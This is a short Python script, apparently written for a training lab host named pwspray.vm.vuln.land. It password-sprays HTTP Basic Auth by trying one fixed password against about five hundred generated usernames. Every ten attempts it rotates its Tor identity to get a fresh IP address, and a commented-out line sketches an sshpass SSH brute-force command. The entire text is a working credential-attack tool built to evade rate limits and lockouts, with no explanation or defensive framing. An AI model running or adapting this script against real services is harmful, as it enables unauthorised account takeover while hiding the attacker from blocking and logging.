import os, sys, requests
from torrequest import TorRequest
from requests.auth import HTTPBasicAuth
url = 'pwspray.vm.vuln.land'
user = {
    'prefix': 'user_',
    'min': 140000,
    'max': 140500
}
password = "44905f6f"
attempts = 10
c = 0

tr=TorRequest()
tr.reset_identity() #Reset Tor
response= tr.get('http://ipecho.net/plain')
print ("New Ip Address",response.text)

for i in range(user['min'], user['max']):
    if (c == attempts):
        c = 0
        tr.reset_identity()
        print('[*] Ip changed !')

    username = user['prefix'] + str(i)
    print("Try with username: " + username)
    # var = 'proxychains sshpass -p ' + line[:-1] + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
    auth = HTTPBasicAuth(username, password)
    req = tr.get('http://' + url, auth=auth)
    if (req.status_code == 200):
        print(req.text)
        exit()
    c += 1
